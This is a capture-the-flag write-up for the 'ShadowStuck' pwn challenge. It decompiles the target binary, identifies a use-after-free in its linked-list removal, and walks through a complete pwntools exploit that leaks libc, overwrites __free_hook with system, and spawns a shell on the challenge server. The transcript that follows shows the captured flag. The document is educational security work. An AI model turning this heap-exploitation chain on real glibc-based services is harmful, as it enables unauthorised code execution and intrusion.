# ShadowStuck [495]
Ever since PITA™ declared the usage of stack canaries inhumane, we've been working on bringing you the latest and greatest in animal-abuse-free stack protector technology. Can you crack it?

`nc challenges.ctf.kaf.sh 8000`

**Files**: shadowstuck libc-2.31.so

### This challenge was done with (the dev version of) [`pwnscripts`](https://github.com/152334H/pwnscripts). Try it!
## FYI
This solution doesn't deal with the shadow stack at all. It's a simple UAF -> overwrite `__free_hook` -> `system('/bin/sh')`. By the time I noticed the BOF option (which was hidden by IDA), I'd already come up with the exploit plan laid out in the write-up.

Anyway,
## Decompilation
```sh
[*] '/home/throwaway/shadowstuck'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
On running the binary, we're immediately given an address leak:
```sh
$ ./shadowstuck
Shadow stack set up at 0x7fce419fd000
Welcome to KEMS, the Kipod Employee Management System!
What would you like to do today?
[A]dd a new a employee
[F]ire an employee
[C]hange employee name
[R]ead employee name
[Q]uit
>
```
The focus of this challenge is (supposed) to be on defeating the [shadow stack](https://people.eecs.berkeley.edu/~daw/papers/shadow-asiaccs15.pdf). As a consequence, the action of the program itself is rather simple, with a basic CLI menu resembling that of most CTF heap challenges.

It still took a number of hours to fully label the decompiled code, but that's just pwn for ya'.

Let's start with a few constants, derived from the binary:
```c
#define NAMESIZE 0x10
typedef struct Employee {
  char name[NAMESIZE];
  Employee* next; // linked list
} Employee;
#define NOTESIZE sizeof(Employee)
Employee *employee_linked_list; // this is g_list_root_0 renamed
```
`Employee` is the important struct that the heap is used for in the binary. It's a basic linked-list that stores 16 bytes of memory per element for a user-controlled input field. The head of the linked-list is stored in the `.bss` segment, under the name `g_list_root` (renamed here to `employee_linked_list`).

There are four ways to manipulate the Employee list:
### Add
This adds an employee to the end of the linked list.
* `manager_add()` a name from `fgets(NAMESIZE)`.
* `manager_log()` it out.
```c
{
  char name[NAMESIZE]; // [rsp-18h] [rbp-18h]
  printf("Enter new employee name:\n> ", retaddr);
  fgets(name, NAMESIZE, stdin);    // guaranteed to null terminate
  remove_newlines(name, NAMESIZE);
  manager_add(name);
  manager_log(NULL, true, name);
}
```
### Fire
This removes a specific employee from any point in the linked list.
* `manager_remove()` a name from `fgets(NAMESIZE)`.
* On success, `manager_log()` a `malloc(NOTESIZE)`'d note with `fgets(NOTESIZE)`, and then free the malloc'd note.
```c
{
  char name[NAMESIZE]; // [rsp-28h] [rbp-28h]
  printf("Which employee would you like to fire?\n> ");
  fgets(name, NAMESIZE, stdin);
  remove_newlines(name, NAMESIZE);
  if (manager_remove(name))
    printf("Could not fire employee with name %s. Maybe no such employee exists?\n", name);
  else {
    printf_("Employee %s removed. Please enter a short note as to why they were fired.\n> ", name);
    char *note = (char *)malloc(NOTESIZE); // Note that this provides the same chunk size as alloc(NAMESIZE).
    fgets(note, NOTESIZE, stdin);
    remove_newlines(note, NOTESIZE);
    manager_log(note, false, name);
    free(note);
  }
}
```
### Change
This alters the value of the `name[]` field for a single element in the linked list.
* Get an unsigned id with `strtoq(fgets(5))`
* if the id is within 0-999, get the employee's name with `fgets(NAMESIZE)`, and send it to `manager_rename()`.
```c
{
  _BYTE id_input[5]; // [rsp-15h] [rbp-15h]
  printf("Which employee ID what you like to rename?\n> ");
  fgets(id_input, 5, stdin);
  remove_newlines(id_input, 5);
  unsigned int uid = strtoq(id_input, NULL, 10);
  if (uid <= 999) {
    char name[NAMESIZE]; // [rsp-28h] [rbp-28h]
    printf("Enter new name for employee:\n> ");
    fgets(name, NAMESIZE, stdin);
    remove_newlines(name, NAMESIZE);
    if (manager_rename(uid, name))
      printf("Could not rename employee #%d, maybe it doesn't exist?\n", uid);
    else
      printf("Renamed employee #%d to %s.\n", uid, name);
  }
  else
    puts("Invalid ID, only 0-999 are supported.");
}
```
### Read
This prints the value of the `name[]` field for a single element in the linked list.
* get an unsigned id with `fgets(5)`, and find the corresponding name with `manager_read()`.
* if the employee exists, print the name found.
```c
{
  _BYTE id[5]; // [rsp-1Dh] [rbp-1Dh]
  printf("Which employee ID what you like to get the name of?\n> ");
  fgets(id, 5, stdin);
  remove_newlines(id, 5);
  unsigned int uid = strtoq(id, 0, 10);
  if (uid <= 0x3E7) {
    Employee *name = manager_read(uid);
    if (name)
      printf("Employee #%d has has name: %s\n", uid, name);
    else
      printf("Could not get name for employee ID %d, maybe it doesn't exist?\n", uid);
  }
  else
    puts("Invalid ID, only 0-999 are supported.");
}
```
Every decompiled function shown above (and below) has a `_cyg_profile_func_enter()` and `__cyg_profile_func_exit()` at the function prologue/epilogue; they're just omitted for brevity.

So far, we've found 0 bugs. It looks like we'll need to dig a little bit deeper. Each of the 4 options is reliant on (at least) one of the `manager_*` functions, so we'll have a look at those.
### manager_remove [bugged]
This function is used to remove the (first) employee of a given input `name` from the linked list.
* Look for the employee `i` of `name` by traversing through `employee_linked_list`.
* Find the parent of `i`, and set the parent's `next` pointer to `i`'s next pointer.
  * **If no parent exists, this part of the step will do nothing.**
* `free(i)`.
```c
__int64 manager_remove(char *name) {
  if (employee_linked_list){
    Employee *i, *j;
    for (i = employee_linked_list; ; i = i->next){
      if (!i) return 1;
      if (strcmp(name, i) == 0) break;
    } // now, i == pointer to the (first) employee of `name`
    for (j = employee_linked_list; j->next; j = j->next){                       
      if ( i == j->next ){ // if the employee's parent is found,
        j->next = i->next; // merge the linked list nodes
        break;
      }
    } // !!! If `i` happens to be the root node; it's pointer won't be removed.
    free(i); // This is open for a double-free due to aforementioned bug
    return 0;
  }
  return 1;
}
```
`manager_remove()` provides the most important bug in our exploit chain; everything else is only useful for the completion of the exploit.
### manager_add
This allocates & appends a new employee of user-controlled `name` to the linked list.
* `calloc()` a new Employee.
* Return failure if the input string length is NAMESIZE or longer.
* Copy over `strlen(name)` bytes from `name` to the newly `calloc()`'d name.
* Add the `calloc()`'d Employee to the end of the linked list.
```c
__int64 manager_add(char *name) {
  Employee *alloc_name = (Employee *)calloc(1, NOTESIZE);
  unsigned int namelen = strlen(name);
  if (name && namelen <= 0xF && alloc_name) {
    memcpy(alloc_name->name, name, namelen);
    if (employee_linked_list) { // if this is not the first employee
      Employee *i;
      for (i = employee_linked_list; i->next; i = i->next);
      i->next = alloc_name;
    } else
      employee_linked_list = alloc_name;
    return 0;
  }
  return 1;
}
```
### manager_read
This just locates the pointer to the `uid`th employee in the linked list.
* Look for the `uid`th employee in the linked list, and return it.
```c
Employee *manager_read(int uid) {
  Employee *result_; // rbx
  Employee *employee; // [rsp-28h] [rbp-28h]
  if (Employee *employee = employee_linked_list)
    for (long long id_count = 0; employee; employee = employee->next)
      if (id_count++ == uid) return employee;
  return 0;
}
```
### manager_rename
This changes the name field of the `uid`th employee.
* Look for the `uid`th employee in the linked list, and copy the given `name` into `employee->name`, so long as `strlen(name) < NAMESIZE`
```c
__int64 manager_rename(int uid, char *name) {
  if (name) {
    unsigned int namelen = strlen(name);
    if (employee_linked_list && namelen <= 0xF) {
      long long id_count = 0;
      for (Employee *employee = employee_linked_list; employee; employee = employee->next)
        if (id_count++ == uid) {
          memcpy(employee->name, name, namelen);
          return 0;
        }
    }
  }
  return 1;
}
```
### manager_log
This is used to print out employee names and sacking notes.
* If an employee is being added, print the `name` variable.
* If an employee is being removed, print `name` and `note`.
```c
__int64 manager_log(char *note@<rdx>, int added@<edi>, char *name@<rsi>) {
  if (!name) return 1;
  if (added) printf_("[LOG]: Added new employee with name %s\n", name);
  else { //employee was removed
    if (!note) return 1;
    printf_("[LOG]: Removed employee with name %s. Reason: %s\n", name, note);
  }
}
```
During that decompilation, I also got to work on a simple python wrapper to make exploitation writing easier:
```python
from pwnscripts import *
context.binary = 'shadowstuck'
context.libc_database = 'libc-database'
context.libc = 'libc-2.31.so'
class KEMS(pwnlib.tubes.remote.remote):
    def _do(p, opt: str):
        if len(opt) != 1: raise ValueError
        p.sendlineafter('> ', opt)
    def add(p, name: bytes):
        p._do('A')
        p.sendlineafter('> ', name)
        return p.recvline()
    def fire(p, name: bytes, note: bytes):
        p._do('F')
        p.sendlineafter('> ', name)
        p.sendlineafter('> ', note)
        return p.recvline()
    def change(p, uid: int, name: bytes):
        p._do('C')
        p.sendlineafter('> ', str(uid))
        p.sendlineafter('> ', name)
        return p.recvline()
    def read(p, uid: int):
        p._do('R')
        p.sendlineafter('> ', str(uid))
        return p.recvline()
    def quit(p, bof: bytes):
        p._do('Q')
        p.recvuntil('BOF on me.\n')
        p.send(bof)
```
We'll be using this for the rest of the passage.
## Ideas
This is libc-2.31 --- Even the tcache has double-free protections here. Instead of targeting a double-free, we can focus on abusing the Use-After-Free capabilities brought by the error in `manager_remove`.

At some point, I realised that the allocation of the `malloc(NOTESIZE)` was important for two reasons:
* For heap allocations on x86-64, there is **no difference** between user-sizes `0x10` and `0x18`; they're both thrown to the bins of true size `0x20`
* Unlike other parts of the binary, `malloc()` is used instead of `calloc()`, pointing to an increased potential for bugs.

My idea at this point was as follows:
1. Allocate an employee. This is `calloc(1,0x18)` with garbage input.
2. Sack that guy (`free()`ing the previous pointer). Due to the bug in `manager_remove`, the sacked employee is **still located** at `employee_linked_list`. At this point, the 0th employee is an employee with a zeroed-out name && a null `next` pointer.
3. The program prompts the user for a note of `malloc(0x18)`. This will return **the same pointer** as the one currently stored at `employee_linked_list`. Write `0x10` bytes of garbage, and then write *a pointer you want to manipulate* (e.g. the given shadow stack pointer).
   * The `0x10` bytes will be zeroed during the `free()` immediately after, but the written pointer will not be.
4. Edit `0x10` bytes of that pointer with `kems_change()`, or maybe read from it with `kems_read()`. Either one is possible.

The shadow stack prevents any exploits that directly target the return pointer. This means that our best bet is probably to just edit `__free_hook` to spawn a shell, rather than having to deal with any of the shadow stack nonsense.

To start, we'll need a libc leak. From gdb experimentation, I realised that the location of the shadow stack is always a constant distance away from the libc page itself. For instance, on a machine I had with a similar (but not identical) libc version:
```py
0x00007ffff7dcd000 0x00007ffff7df2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7df2000 0x00007ffff7f6a000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f6a000 0x00007ffff7fb4000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb4000 0x00007ffff7fb5000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb5000 0x00007ffff7fb8000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb8000 0x00007ffff7fbb000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fbb000 0x00007ffff7fc1000 0x0000000000000000 rw-
0x00007ffff7fc8000 0x00007ffff7fc9000 0x0000000000000000 ---
0x00007ffff7fc9000 0x00007ffff7fca000 0x0000000000000000 rw- [Shadow Stack]
```
ASLR is enabled in the vmmap dump above, but even with ASLR enabled, the offset between libc and the `mmap()`'d shadow stack is still a constant, albeit a different one.

To find the actual constant offset on the remote, we can abuse the exploit steps above to run `kems_read()` on the shadow stack itself, leaking out the location of `__libc_start_main_ret`:
```python
p = KEMS('challenges.ctf.kaf.sh', 8000)
shadow_stack = unpack_hex(p.recvline())
p.add(b'me')
p.fire(b'me', b'a'*0x10 + pack(shadow_stack+1)[:6]) # `fgets()` will stop reading on a null byte, so we'll add 1 to the address.
libc_leak = p.read(1).split(b': ')[-1][:5]   # This is a byte leak of __libc_start_main_ret[1:6].
context.libc.address = (unpack_bytes(libc_leak,5)-context.libc.symbols['__libc_start_main_ret']//0x100)*0x100
SHADOW_OFFSET = shadow_stack-context.libc.address
log.info('The distance between libc and the shadow stack is ' + hex(SHADOW_OFFSET))
```
After that, we'll be able to use the given pointer of the shadow stack to directly calculate the location of `__free_hook`. Once that's possible, it's trivial to recycle the exploit to call `system("/bin/sh")` via the `kems_fire()` method, which gives us a call to `free()` with user-controlled input.
```python
p = KEMS('challenges.ctf.kaf.sh', 8000)
context.libc.address = unpack_hex(p.recvline())-SHADOW_OFFSET
p.add(b'me')
# Set the employee_linked_list->next pointer to free_hook.
p.fire(b'me', b'a'*0x10 + pack(context.libc.symbols['__free_hook'])[:6])
p.change(1, pack(context.libc.symbols['system'])[:6])
p.fire(b'', b'/bin/sh') # The 0th employee has a null name at this point, hence the b''.
log.info('Opening shell.')
p.interactive()
```
That's it.
```python
[+] Opening connection to challenges.ctf.kaf.sh on port 8000: Done
[*] The distance between libc and the shadow stack is -0x2000
[+] Opening connection to challenges.ctf.kaf.sh on port 8000: Done
[*] Opening shell.
[*] Switching to interactive mode
$ ls
flag
shadowstuck
ynetd
$ cat flag
KAF{1_SUR3_H0P3_C3T_1S_B3TTER_WR1TTEN}
$
```
### Main
There's no need to understand how `main()` works to complete this challenge, but the analysis is here for viewing anyway:
* Prior to main, the shadow stack is initialised && leaked.
* `main()` does a simple menu loop that can be exited with Q.
* Quitting will grant a simple BOF that will (almost certainly) lead to an exit due to the shadow stack.
```c
int main() {
  unsigned __int8 c; // [rsp-19h] [rbp-19h]
  void * retaddr; // [rbp+0h] /* this should really be rbp+0x8 */
  _cyg_profile_func_enter(main, retaddr);
  setvbuf(stdout, 0, 2, 0);
  puts("Welcome to KEMS, the Kipod Employee Management System!\nWhat would you like to do today?");
  while (1) {
    printf_("[A]dd a new a employee\n[F]ire an employee\n[C]hange employee name\n[R]ead employee name\n[Q]uit\n> ", 0LL);
    while ((c = getc(stdin)) != '\n');
    unsigned int action = c-'A'; //eax
    if (action <= 0x11)
      switch (action) {
        case 0: // Add
          kems_add(); break;
        case 2: // Change
          kems_change(); break;
        case 5: // Fire
          kems_fire(); break;
        case 16: /* Our exploit never uses this section! Hurray for unintended solutions. */
          puts("Sure you want to leave? Here, have a BOF on me.");
          fgets(rbp-0x11, 0x40, stdin);
          remove_newlines(rbp-0x11, 0x40);
          // ebx = 0;
          __cyg_profile_func_exit(main, retaddr);
          return 0; // add rsp 0x18, pop rbx, pop rbp;
        case 17:
          kems_read(); break;
      }
    puts_("\nInvalid action! Please try again.");
  }
}
```
### remove_newlines
This function is self-describing, so I didn't bother to talk about it. It's still relatively important, though, so here it is:
```c
__int64 remove_newlines(char *s, unsigned int len) {
  for (unsigned i = 0; i < len; ++i)
    if (s[i] == '\n') s[i] = '\0';
}
```
